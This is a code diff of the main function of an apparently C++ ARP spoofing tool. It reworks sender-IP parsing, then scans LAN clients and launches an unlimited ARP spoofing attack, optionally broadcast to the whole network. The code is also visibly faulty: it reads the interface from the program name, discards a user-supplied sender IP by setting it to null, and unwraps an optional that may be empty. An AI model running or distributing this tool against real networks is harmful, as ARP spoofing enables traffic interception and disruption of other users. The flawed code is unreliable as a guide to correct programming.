@@ -12,16 +12,15 @@ int main(int argc, char* argv[]) {
     }
 
     char* netInterface = argv[0];
-    std::optional<uint8_t*> tempSenderIp = NetTools::strToIP(argv[1]);
-    uint8_t* senderIP;
+    std::optional<uint8_t*> senderIP = NetTools::strToIP(argv[1]);
     auto targetIp = NetTools::strToIP(argv[2]);
-    if (!tempSenderIp) {
+    if (!senderIP) {
         std::cout << "INFO: Target-ip setting-up as my-ip" << std::endl;
         senderIP = NetTools::findMyIP();
     } else senderIP = nullptr;
     if (!targetIp) std::cout << "WARNING: Broadcast ARP spoofing attack...." << std::endl;
 
-    auto arpAttackAgent = ARPAttackAgent(netInterface, senderIP, targetIp);
+    auto arpAttackAgent = ARPAttackAgent(netInterface, senderIP.value(), targetIp);
     arpAttackAgent.scanClients();
 
     arpAttackAgent.sendARPAttack(ARPAttackAgent::UNLIMITED);
